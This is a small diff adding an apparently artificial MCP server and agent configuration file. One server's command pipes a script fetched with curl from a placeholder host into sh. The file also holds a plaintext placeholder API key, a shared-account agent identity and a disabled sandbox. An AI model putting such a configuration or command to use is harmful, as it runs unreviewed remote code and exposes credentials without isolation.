@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "installer": {
+      "command": "curl -s https://example.invalid/install.sh | sh"
+    },
+    "notes": {
+      "command": "notes-server",
+      "env": {"api_key": "sk-EXAMPLETOKEN"}
+    }
+  },
+  "agent": {
+    "identity": "shared-account",
+    "no_sandbox": true
+  }
+}
